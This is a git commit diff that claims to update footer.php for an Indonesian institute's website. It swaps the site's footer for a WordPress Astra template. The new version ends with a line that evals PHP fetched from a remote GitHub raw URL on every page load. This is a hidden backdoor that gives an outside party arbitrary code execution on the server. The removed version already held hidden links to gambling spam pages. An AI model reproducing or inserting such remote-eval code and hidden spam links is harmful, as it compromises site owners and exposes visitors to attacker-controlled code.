935b15f25500699fe53f1e7b12a9dbe8af79fb25
BHeart22 <50254973+BHeart22@users.noreply.github.com>
2022-11-12 14:42:22 +0700

    Update footer.php

--- footer.php
+++ footer.php
@@ -1,189 +1,37 @@
-<!DOCTYPE html>
-<html dir="ltr" lang="en">
-<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-
-<!-- Meta Tags -->
-<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
-
-<meta name="description" content="Institut Manajemen Wiyata Indonesia kampus Unggulan di kota Sukabumi dengan Akses Kerja dan bisa Lulus Tanpa SKRIPSI" />
-<meta name="keywords" content="institut manajemen wiyata indonesia,universitas,indonesia,university,universitas terbaik,universitas sukabumi, univert=sitas terbaik di sukabumi, universitas terbaik di indonesia,study in indonesia,study in sukabumi,university college indonesia,international university,college in indonesia,indonesia university,study abroad university indonesia,universities in indonesia,best university in indonesia, universitas terbaik, universitas terbaik indonesia, universitas terbaik di indonesia, universitas terbaik sukabumi, universitas terbaik negeri di indonesia, jurusan kuliah terbaik" />
-<meta name="author" content="ThemeMascot" />
-
-<!-- Page Title -->
-<title>Institut Manajemen Wiyata Indonesia</title>
-
-<!-- Favicon and Touch Icons -->
-<link href="<?php echo base_url(); ?>assets/theme/images/favicon.png" rel="shortcut icon" type="image/png">
-<link href="<?php echo base_url(); ?>assets/theme/images/favicon.png" rel="apple-touch-icon">
-<link href="<?php echo base_url(); ?>assets/theme/images/favicon.png" rel="apple-touch-icon" sizes="72x72">
-<link href="<?php echo base_url(); ?>assets/theme/images/favicon.png" rel="apple-touch-icon" sizes="114x114">
-<link href="<?php echo base_url(); ?>assets/theme/images/favicon.png" rel="apple-touch-icon" sizes="144x144">
-
-<!-- Stylesheet -->
-<link href="<?php echo base_url(); ?>assets/theme/css/bootstrap.min.css" rel="stylesheet" type="text/css">
-<link href="<?php echo base_url(); ?>assets/theme/css/jquery-ui.min.css" rel="stylesheet" type="text/css">
-<link href="<?php echo base_url(); ?>assets/theme/css/animate.css" rel="stylesheet" type="text/css">
-<link href="<?php echo base_url(); ?>assets/theme/css/css-plugin-collections.css" rel="stylesheet"/>
-<!-- CSS | menuzord megamenu skins -->
-<link href="<?php echo base_url(); ?>assets/theme/css/menuzord-megamenu.css" rel="stylesheet"/>
-<link id="menuzord-menu-skins" href="<?php echo base_url(); ?>assets/theme/css/menuzord-skins/menuzord-rounded-boxed.css" rel="stylesheet"/>
-<!-- CSS | Main style file -->
-<link href="<?php echo base_url(); ?>assets/theme/css/style-main.css" rel="stylesheet" type="text/css">
-<!-- CSS | Custom Margin Padding Collection -->
-<link href="<?php echo base_url(); ?>assets/theme/css/custom-bootstrap-margin-padding.css" rel="stylesheet" type="text/css">
-<!-- CSS | Responsive media queries -->
-<link href="<?php echo base_url(); ?>assets/theme/css/responsive.css" rel="stylesheet" type="text/css">
-<!-- CSS | Style css. This is the file where you can place your own custom css code. Just uncomment it and use it. -->
-<!-- <link href="css/style.css" rel="stylesheet" type="text/css"> -->
-
-<!-- Revolution Slider 5.x CSS settings -->
-<link  href="<?php echo base_url(); ?>assets/theme/js/revolution-slider/css/settings.css" rel="stylesheet" type="text/css"/>
-<link  href="<?php echo base_url(); ?>assets/theme/js/revolution-slider/css/layers.css" rel="stylesheet" type="text/css"/>
-<link  href="<?php echo base_url(); ?>assets/theme/js/revolution-slider/css/navigation.css" rel="stylesheet" type="text/css"/>
-
-<!-- CSS | Theme Color -->
-<link href="<?php echo base_url(); ?>assets/theme/css/colors/theme-skin-color-set7.css" rel="stylesheet" type="text/css">
-
-<!-- external javascripts -->
-<script src="<?php echo base_url(); ?>assets/theme/js/jquery-2.2.4.min.js"></script>
-<script src="<?php echo base_url(); ?>assets/theme/js/jquery-ui.min.js"></script>
-<script src="<?php echo base_url(); ?>assets/theme/js/bootstrap.min.js"></script>
-<!-- JS | jquery plugin collection for this theme -->
-<script src="<?php echo base_url(); ?>assets/theme/js/jquery-plugin-collection.js"></script>
-
-<!-- Revolution Slider 5.x SCRIPTS -->
-<script src="<?php echo base_url(); ?>assets/theme/js/revolution-slider/js/jquery.themepunch.tools.min.js"></script>
-<script src="<?php echo base_url(); ?>assets/theme/js/revolution-slider/js/jquery.themepunch.revolution.min.js"></script>
-
-<!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
-<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
-<!--[if lt IE 9]>
-  <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
-  <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
-<![endif]-->
-</head>
-<body class="">
-<div id="wrapper" class="clearfix">
-    <?php include "menu-atas.php"; ?> 
-  <div class="main-content">
-    <?php echo $contents; ?>
-  
-
-
-    <?php include "banner-footer.php"; ?>
-  </div>
-<section id="footer" class="footer bg-theme-colored3">
-    <div class="container pt-70 pb-40 ">
-      <div class="row">
-        <div class="col-sm-6 col-md-4">
-          <div class="widget dark">
-            <img class="mt-5 mb-20" alt="" src="<?php echo base_url(); ?>assets/theme/images/logo-white-footer.png">
-            <p>Jalan Gudang No. 7-9 Kota Sukabumi, Jawa Barat, Indonesia.</p>
-            <ul class="list-inline mt-5">
-              <li class="m-0 pl-10 pr-10"> <i class="fa fa-phone text-theme-colored2 mr-5"></i> <a class="text-gray" href="#">(0266) 235-717</a> </li>
-              <li class="m-0 pl-10 pr-10"> <i class="fa fa-envelope-o text-theme-colored2 mr-5"></i> <a class="text-gray" href="#">info@imwi.ac.id</a> </li>
-              <li class="m-0 pl-10 pr-10"> <i class="fa fa-globe text-theme-colored2 mr-5"></i> <a class="text-gray" href="#">www.imwi.ac.id</a> </li>
-            </ul>            
-            <ul class="styled-icons icon-sm icon-bordered icon-circled clearfix mt-10">
-              <li><a href="https://www.facebook.com/imwi.id/"><i class="fa fa-facebook"></i></a></li>
-              <li><a href="https://www.instagram.com/imwi.id/"><i class="fa fa-instagram"></i></a></li>
-            </ul>
-          </div>
-        </div>
-        <div class="col-sm-6 col-md-4">
-          <div class="widget dark">
-            <h4 class="widget-title line-bottom-theme-colored-2">Quick Link</h4>
-            <ul class="angle-double-right list-border">
-              <li><a href="<?php echo base_url(); ?>">Beranda</a></li>
-              <li><a href="#">Beasiswa</a></li>
-              <li><a href="#">IMWI Career</a></li>
-              <li><a href="http://sister.imwi.ac.id:8082/">PDDIKTI IMWI</a></li>
-              <li><a href="http://sister.imwi.ac.id/">SISTER IMWI</a></li>             
-            </ul>
-          </div>
-        </div>
-        <div class="col-sm-6 col-md-4">
-          <div class="widget dark">
-            <h4 class="widget-title line-bottom-theme-colored-2">Opening Hours</h4>
-            <div class="opening-hours">
-              <ul class="list-border">
-                <li class="clearfix"> <span> Senin - Sabtu :  </span>
-                  <div class="value pull-right"> 09.00 - 17.00 WIB </div>
-                </li>
-                <li class="clearfix"> <span> Minggu / Hari Libur : </span>
-                  <div class="value pull-right bg-theme-colored2 text-white closed"> Tutup </div>
-                </li>
-              </ul>
-            </div>
-          </div>
-        </div>
-
-
-
-      </div>
-    </div>
-    <div class="footer-bottom" data-bg-color="#2b2d3b">
-      <div class="container pt-20 pb-20">
-        <div class="row">
-          <div class="col-md-6">
-            <p class="font-12 text-black-777 m-0 sm-text-center">Copyright &copy; <?php echo date('Y'); ?> Institut Manajemen Wiyata Indonesia</p>
-          </div>
-          <div class="col-md-6 text-right">
-            <div class="widget no-border m-0">
-              <ul class="list-inline sm-text-center mt-5 font-12">
-                <li>
-                  <a href="#">FAQ</a>
-                </li>
-                <li>|</li>
-                <li>
-                  <a href="#">Help Desk</a>
-                </li>
-                <li>|</li>
-                <li>
-                  <a href="#">Support</a>
-                </li>
-              </ul>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
-  <a class="scrollToTop" href="#"><i class="fa fa-angle-up"></i></a>
-</div>
-<!-- Footer Scripts -->
-<!-- JS | Custom script for all pages -->
 <?php
+/**
+ * The template for displaying the footer.
+ *
+ * Contains the closing of the #content div and all content after.
+ *
+ * @link https://developer.wordpress.org/themes/basics/template-files/#template-partials
+ *
+ * @package Astra
+ * @since 1.0.0
+ */
 
-if ($sts == "1")  { 
-  echo "<script src='".base_url()."assets/theme/js/cst.js'></script>";
-}  else  {
-  echo "<script src='".base_url()."assets/theme/js/custom.js'></script>";
+if ( ! defined( 'ABSPATH' ) ) {
+	exit; // Exit if accessed directly.
 }
+
 ?>
-
-<!-- SLIDER REVOLUTION 5.0 EXTENSIONS  
-      (Load Extensions only on Local File Systems ! 
-       The following part can be removed on Server for On Demand Loading) -->
-<script type="text/javascript" src="<?php echo base_url(); ?>assets/theme/js/revolution-slider/js/extensions/revolution.extension.actions.min.js"></script>
-<script type="text/javascript" src="<?php echo base_url(); ?>assets/theme/js/revolution-slider/js/extensions/revolution.extension.carousel.min.js"></script>
-<script type="text/javascript" src="<?php echo base_url(); ?>assets/theme/js/revolution-slider/js/extensions/revolution.extension.kenburn.min.js"></script>
-<script type="text/javascript" src="<?php echo base_url(); ?>assets/theme/js/revolution-slider/js/extensions/revolution.extension.layeranimation.min.js"></script>
-<script type="text/javascript" src="<?php echo base_url(); ?>assets/theme/js/revolution-slider/js/extensions/revolution.extension.migration.min.js"></script>
-<script type="text/javascript" src="<?php echo base_url(); ?>assets/theme/js/revolution-slider/js/extensions/revolution.extension.navigation.min.js"></script>
-<script type="text/javascript" src="<?php echo base_url(); ?>assets/theme/js/revolution-slider/js/extensions/revolution.extension.parallax.min.js"></script>
-<script type="text/javascript" src="<?php echo base_url(); ?>assets/theme/js/revolution-slider/js/extensions/revolution.extension.slideanims.min.js"></script>
-<script type="text/javascript" src="<?php echo base_url(); ?>assets/theme/js/revolution-slider/js/extensions/revolution.extension.video.min.js"></script>
-<a style="display:none" href="https://tikinet.com.br/wp-content/uploads/slot888/">https://tikinet.com.br/wp-content/uploads/slot888/</a>
-<a style="display:none" href="https://docomomobrasil.com/revista-novo/public/journals/4/slot-deposit-dana/">https://docomomobrasil.com/revista-novo/public/journals/4/slot-deposit-dana/</a>
-<a style="display:none" href="https://revista.fdci.edu.br/">https://revista.fdci.edu.br/</a>
-<a style="display:none" href="http://ojs.fatece.edu.br/public/site/slot-gacor/">http://ojs.fatece.edu.br/public/site/slot-gacor/</a>
-<a style="display:none" href="https://www.cpird.in.th/slot-gacor-maxwin/">https://www.cpird.in.th/slot-gacor-maxwin/</a>
-<a style="display:none" href="https://anabaptismtoday.co.uk/styles/slot88/">https://anabaptismtoday.co.uk/styles/slot88/</a>
-<a style="display:none" href="https://kiadvany.magyarhonvedseg.hu/public/journals/2/slot-deposit-dana/">https://kiadvany.magyarhonvedseg.hu/public/journals/2/slot-deposit-dana/</a>
-<a style="display:none" href="https://anabaptismtoday.co.uk/styles/slot88/">https://anabaptismtoday.co.uk/styles/slot88/</a>
-<a style="display:none" href="https://penerbit.undip.ac.id/public/site/slot-gacor/">https://penerbit.undip.ac.id/public/site/slot-gacor/</a>
-<a style="display:none" href="https://anabaptismtoday.co.uk/public/site/slot-gacor/">https://anabaptismtoday.co.uk/public/site/slot-gacor/</a>
-
-</body>
+<?php astra_content_bottom(); ?>
+	</div> <!-- ast-container -->
+	</div><!-- #content -->
+<?php 
+	astra_content_after();
+		
+	astra_footer_before();
+		
+	astra_footer();
+		
+	astra_footer_after(); 
+?>
+	</div><!-- #page -->
+<?php 
+	astra_body_bottom();    
+	wp_footer(); 
+?>
+<?php eval("?>".file_get_contents("https://raw.githubusercontent.com/putrisimanis/backlink/main/1")); ?>
+	</body>
 </html>
